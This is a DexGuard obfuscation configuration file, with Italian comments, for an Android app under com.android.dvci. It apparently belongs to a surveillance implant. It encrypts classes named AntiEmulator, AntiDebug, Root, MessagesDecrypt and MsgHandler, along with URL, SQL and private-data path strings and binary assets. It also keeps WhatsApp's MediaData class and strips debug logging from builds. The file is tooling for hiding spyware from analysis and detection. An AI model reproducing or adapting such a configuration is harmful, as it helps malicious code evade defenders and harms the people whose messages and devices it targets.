
#-verbose
-encryptclasses com.android.dvci.util.AntiEmulator,com.android.dvci.MessagesDecrypt,
		com.android.dvci.Root,com.android.dvci.Core,
		com.android.dvci.util.AntiDebug,com.android.dvci.util.AntiEmulator,
		com.android.dvci.module.message.MsgHandler

-encryptclasses dexguard.util.**

-encryptstrings "http://*","https://*","/data/data/*","/auth/user_data/*","l*",".lost.found"
-encryptstrings "AES*","*SELECT*","select*","gt-*","*.google.com","getApplicationInfo"

-encryptclasses com.android.m.*
-encryptstrings "KY*"
-encryptstrings "android.intent.*","android.net.*","vnd.android.*"

-accessthroughreflection class android.content.pm.ApplicationInfo {
    int flags;
}

-accessthroughreflection class android.content.pm.PackageManager {
    java.lang.String getInstallerPackageName(java.lang.String);
}

-encryptstrings "android.content.pm.ApplicationInfo", "flags"
-encryptassetfiles "*.bin"

#-dontobfuscate
#-dontoptimize

#  here:  !code/simplification/*
#-optimizations !code/*
#-optimizations !code/simplification/*
#-optimizations !code/merging, !code/removal/*
#-optimizations !code/removal/advanced
# -optimizations !code/simplification/variable,!code/simplification/arithmetic,!code/simplification/cast
# -optimizations !code/simplification/cast

# l'ottimizzazione seguente fa crashare smali, disabilitare solo se occorre manipolare il codice
@MERGE@ -optimizations !method/marking/final
-optimizations !method/inlining/*

-classobfuscationdictionary "keywords.txt"
-packageobfuscationdictionary "keywords.txt"
-obfuscationdictionary "keywords.txt"
-useuniqueclassmembernames
@MAPPING@ -applymapping "rcs_mapping.txt"

#togliere l'offuscamento di iSR
-keepclassmembers class com.android.dvci.Core {
    public static boolean iSR();
}

-keepresourcexmlattributenames assets/*.bin, 
    manifest/installLocation,
    manifest/versionCode,
    manifest/application/*/intent-filter/*/name,
    res/layout/main.xml,
    res/values/*

-keep public class android.media.AmrInputStream
-keep public class com.android.dvci.BM
-keep public class com.android.dvci.listener.AR
-keep public class com.android.dvci.optimize.NetworkOptimizer
-keep public class com.whatsapp.MediaData
-keepclassmembers class com.whatsapp.MediaData implements java.io.Serializable {
    static final long serialVersionUID;
    !static !transient <fields>;
}

@RELEASE@ -keep public class com.android.dvci.gui.ASG

-keep class android.media.** {*;}

@DEBUG@ -assumenosideeffects class android.util.Log {
@DEBUG@     public static boolean isLoggable(java.lang.String, int);
@DEBUG@     public static int v(...);
@DEBUG@     public static int i(...);
@DEBUG@     public static int w(...);
@DEBUG@     public static int d(...);
@DEBUG@     public static int e(...);
@DEBUG@ }

@DEBUG@ -assumenosideeffects class com.android.dvci.util.Check {
@DEBUG@     public static void asserts(...);
@DEBUG@     public static void requires(...);
@DEBUG@     public static void ensures(...);
@DEBUG@     public static void log(...);
@DEBUG@     public static void testDexguard(...);
@DEBUG@ }

-include dexguard-common.pro
-include dexguard-assumptions.pro

